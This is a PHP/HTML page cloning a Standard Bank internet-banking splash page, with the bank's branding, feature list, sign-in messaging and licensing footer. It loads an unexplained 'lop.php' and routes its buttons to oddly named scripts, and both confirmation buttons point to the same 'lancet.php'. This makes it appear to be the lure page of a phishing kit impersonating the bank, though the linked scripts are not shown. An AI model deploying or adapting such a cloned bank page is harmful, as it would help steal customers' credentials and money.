<?php
require 'lop.php';
?>
<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">    

    <title>Splash page</title>

    <!-- Bootstrap Core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="css/sb-ib-splash.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="css/fontello.css">
    <link rel="icon" type="image/png" href="images/favicon2.ico" />
    <script src="js/init.js"></script>


</head>

<body id="page-top" class="index">

    <!-- Navigation -->
    <nav class="navbar navbar-default navbar-fixed-top navbar-shrink">
        <div class="container">
            <!-- Toggle Mobile navigation -->
            <div class="navbar-header page-scroll">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand page-scroll" href="#page-top"><img class="logo-img" src="images/logo.png" class="img-responsive" alt=""></a>
            </div>

            <!-- Toggle mobile navigation -->
            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                <ul class="nav navbar-nav navbar-right">
                    <li class="hidden">
                        <a href="#page-top"></a>
                    </li>
                    <li>
                        <a class="page-scroll" href="#features">Features</a>
                    </li>
                    <li>
                        <a class="page-scroll" href="#standardbankid">Standard Bank ID</a>
                    </li>
                    <li>
                        <a class="page-scroll" href="#cant-find">Can't find what you looking for?</a>
                    </li>
                    <li>
                        <a class="page-scroll" href="#newdesign">New design</a>
                    </li>
                </ul>
            </div>
            <!-- /.navbar-collapse -->
        </div>
        <!-- /.container-fluid -->
    </nav>

    <!-- Header -->
    <header>
        <div class="container">
            <div class="intro-text">
                <div class="intro-lead-in">The next level of Internet banking</div>
                <div class="intro-heading">A streamlined, simpler online banking experience</div>
                <div class="action-buttons">
                    <a href="mait.php" class="btn btn-secondary">Try it later</a>
                    <span class="sub_text">Take me to the current site</span>
                </div>
                <div class="action-buttons">
                    <a href="exp.php" class="btn btn-primary">Try it now</a>
                    <span class="sub_text">You can switch back at any time</span>
                </div>
            </div>
        </div>
    </header>

    <!-- Features Section -->
    <section id="features">
        <div class="container">
            <div class="row row-space">
                <div class="col-lg-12 text-center">
                    <h2 class="section-heading">Available features</h2>
                </div>
            </div>
            <div class="row text-center row-space">
                <div class="col-md-3 col-sm-4 col-xs-12">
                    <span class="icon-img">
                        <img src="images/pay-group.svg">
                    </span>
                    <h4 class="service-heading">Easy beneficiary payments</h4>
                </div>
                <div class="col-md-3 col-sm-4 col-xs-12">
                    <span class="icon-img">
                        <img src="images/pay once off.svg">
                    </span>
                    <h4 class="service-heading">Streamlined once-off payments</h4>
                </div>
                <div class="col-md-3 col-sm-4 col-xs-12">
                    <span class="icon-img">
                        <img src="images/scheduled-payments.svg">
                    </span>
                    <h4 class="service-heading">Flexible future & repeat payments</h4>
                </div>
                <div class="col-md-3 col-sm-4 col-xs-12">
                    <span class="icon-img">
                        <img src="images/notifications.svg">
                    </span>
                    <h4 class="service-heading">Fax, email & SMS payment notifications</h4>
                </div>
                <div class="col-md-3 col-sm-4 col-xs-12">
                    <span class="icon-img">
                        <img src="images/transfer.svg">
                    </span>
                    <h4 class="service-heading">Improved inter-account transfers</h4>
                </div>
                <div class="col-md-3 col-sm-4 col-xs-12">
                    <span class="icon-img">
                        <img src="images/beneficiary-search.svg">
                    </span>
                    <h4 class="service-heading">Dynamic beneficiary search</h4>
                </div>
                <div class="col-md-3 col-sm-4 col-xs-12">
                    <span class="icon-img">
                        <img src="images/edit.svg">
                    </span>
                    <h4 class="service-heading">Add, edit, group & delete beneficiaries</h4>
                </div>
                <div class="col-md-3 col-sm-4 col-xs-12">
                    <span class="icon-img">
                        <img src="images/view-statements.svg">
                    </span>
                    <h4 class="service-heading">View statements</h4>
                </div>
            </div>
            <div class="row text-center row-space">
                <p class="text-muted">And we're just getting started...</p>
            </div>
        </div>
    </section>

    <!-- Your email + password = Standard Bank ID -->
    <section id="standardbankid" class="bg-light-gray">
        <div class="container">
            <div class="row">
                <div class="col-lg-12 text-center">
                    <h2 class="section-heading">Your email + password = Standard Bank ID</h2>
                    <h3 class="section-subheading text-muted">We’re simplifying the process of signing in. <br /> Your new Standard Bank ID is based on your email address - use it to sign in to Internet banking as well as our tablet and smartphone App.</h3>
                </div>
            </div>
            <div class="row img-responsive sb-id-img">
                <img src="images/cant-find-full-user-img.png">
            </div>
        </div>
    </section>

    <!-- Can't find what you're looking for? section -->
    <section id="cant-find">
        <div class="container">
            <div class="row">
                <div class="col-lg-12 text-center">
                    <h2 class="section-heading">Can't find what you're looking for?</h2>
                    <h3 class="section-subheading text-muted">Can’t find a particular feature on the new site? Simply head back to the old Internet banking site. The old and new sites will be available to you until both versions offer all the banking features you’ve come to expect from us.</h3>
                </div>
            </div>
            <div class="row img-responsive cant-find-img">
                <img src="images/cant-find-img.png">
            </div>
        </div>
    </section>

    <!-- Sleek, responsive design section -->
    <section id="newdesign" class="bg-light-gray">
        <div class="container">
            <div class="row">
                <div class="col-lg-12 text-center">
                    <h2 class="section-heading">Sleek, responsive design</h2>
                    <h3 class="section-subheading text-muted">Our new Internet banking site is simple, intuitive and available wherever you are. Try it on your smartphone, tablet, laptop and desktop computer.</h3>
                </div>
            </div>
            <div class="row img-responsive cant-find-img">
                <img src="images/sleek-responsive-design-img.png">
            </div>
        </div>
    </section>

    <!-- Confirmation section -->
    <section id="confirmation">
        <div class="container">
            <div class="row">
                <div class="col-lg-12 text-center">
                    <h1 class="section-heading">Ready to try the new Internet banking site?</h1>
                </div>
                <div class="col-lg-12 text-center">
                    <div class="action-buttons">
                        <a href="lancet.php" class="btn btn-secondary">Try it later</a>
                        <span class="sub_text">Take me to the current site</span>
                    </div>
                    <div class="action-buttons">
                        <a href="lancet.php" class="btn btn-primary">Try it now</a>
                        <span class="sub_text">You can switch back at any time</span>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <footer>
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                   <div class="footer">Standard Bank is a licensed financial services provider in terms of the Financial Advisory and Intermediary Services Act and a registered credit provider in terms of the National Credit Act, registration number NCRCP15.</div>
                </div>
            </div>
        </div>
    </footer>

    <!-- jQuery Version 1.11.0 -->
    <script src="js/jquery-1.11.0.js"></script>

    <!-- Bootstrap Core JavaScript -->
    <script src="js/bootstrap.min.js"></script>

    <!-- Plugin JavaScript -->
    <script src="js/jquery.easing.min.js"></script>
    <script src="js/classie.js"></script>

    <!-- Contact Form JavaScript -->
    <script src="js/jqBootstrapValidation.js"></script>
    <script src="js/contact_me.js"></script>

    <!-- Custom Theme JavaScript -->
    <script src="js/agency.js"></script>

</body>

</html>

